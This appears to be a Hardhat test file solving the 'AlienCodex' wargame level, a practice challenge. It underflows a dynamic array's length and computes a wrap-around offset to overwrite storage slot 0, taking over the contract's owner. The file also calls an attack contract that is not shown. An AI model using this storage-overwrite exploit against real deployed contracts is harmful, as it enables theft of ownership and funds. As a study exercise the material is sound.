const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("19-AlienCodex", async function () {
    let deployer, attacker, alienCodex, alienCodexAttack
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["19"])
        alienCodex = await ethers.getContract("AlienCodex", attacker.address)
        alienCodexAttack = await ethers.getContract("AlienCodexAttack", attacker.address)
    })
    it("should claim ownership of the contract", async function () {
        /*
        - dynamic arrays and mapping are stored differently to other variable types
        - a slot containing their length is stored as normal
            - in this instance the length of codex is at slot 1
                - slot 0 contains owner and contact
        - array items are stored elsewhere
            - codex[0] is at slot keccak256(uint256(1))
                - where 1 = slot containing codex.length
            - codex[i] is at slot keccak256(uint256(1)) + i
        */

        // check deployer is owner of the contract
        const owner = await alienCodex.owner()
        assert.equal(owner, deployer.address)

        // make contact
        await alienCodex.make_contact()

        // cause underflow
        await alienCodex.retract()

        // get offset to acces slot 0 using codex array
        const arraySlotZero = ethers.utils.keccak256(ethers.utils.hexZeroPad("0x1", 32))
        const uintArraySlotZero = ethers.BigNumber.from(arraySlotZero)
        const maxUint256 = ethers.BigNumber.from("0x" + "f".repeat(64))
        const offset = maxUint256.sub(uintArraySlotZero).add(1)

        // overwrite storage slot 0 with our address & contact = true
        const content = ethers.utils.hexZeroPad("0x1" + attacker.address.slice(2), 32)
        await alienCodex.revise(offset, content)

        // check it worked
        const newOwner = await alienCodex.owner()
        assert.equal(newOwner, attacker.address)
    })
    it("should claim ownership using attack contract", async function () {
        // check deployer is owner of the contract
        const owner = await alienCodex.owner()
        assert.equal(owner, deployer.address)

        // run attack function
        await alienCodexAttack.attack()

        // check it worked
        const newOwner = await alienCodex.owner()
        assert.equal(newOwner, attacker.address)
    })
})
